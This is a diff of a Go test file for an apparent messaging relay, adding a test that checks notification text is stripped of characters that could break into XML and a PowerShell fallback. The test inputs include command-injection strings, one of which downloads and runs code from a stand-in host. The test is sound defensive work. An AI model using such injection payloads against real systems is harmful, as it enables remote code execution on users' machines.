@@ -3,6 +3,7 @@ package main
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"altnet-relay/engine"
@@ -97,5 +98,28 @@ func TestUnknownSettingIsRefused(t *testing.T) {
 	a := newTestApp(t)
 	if err := a.SetSetting("nonsense", true); err == nil {
 		t.Fatal("an unknown setting should be an error")
+	}
+}
+
+// Group names are chosen by whoever invites you, and on Windows a
+// notification's text could break out into XML and then into a PowerShell
+// fallback that runs "$(...)". Nothing of that kind may reach a notification.
+func TestNotificationTextIsPlain(t *testing.T) {
+	for _, evil := range []string{
+		"]]><$(iwr evil.example|iex)",
+		"x\"@\n$(calc)",
+		"`$(calc)` <toast> & [x]",
+		"a\r\nb",
+	} {
+		got := toastText("You're invited to " + evil)
+		if strings.ContainsAny(got, "$`\"<>&[]\r\n") {
+			t.Errorf("toastText(%q) = %q, still has a special character", evil, got)
+		}
+	}
+	if got := toastText("New message in #design · Příliš žluťoučký kůň (general)"); got != "New message in #design · Příliš žluťoučký kůň (general)" {
+		t.Errorf("ordinary text changed: %q", got)
+	}
+	if got := toastText(strings.Repeat("a", 500)); len(got) > maxToastText {
+		t.Errorf("not shortened: %d characters", len(got))
 	}
 }
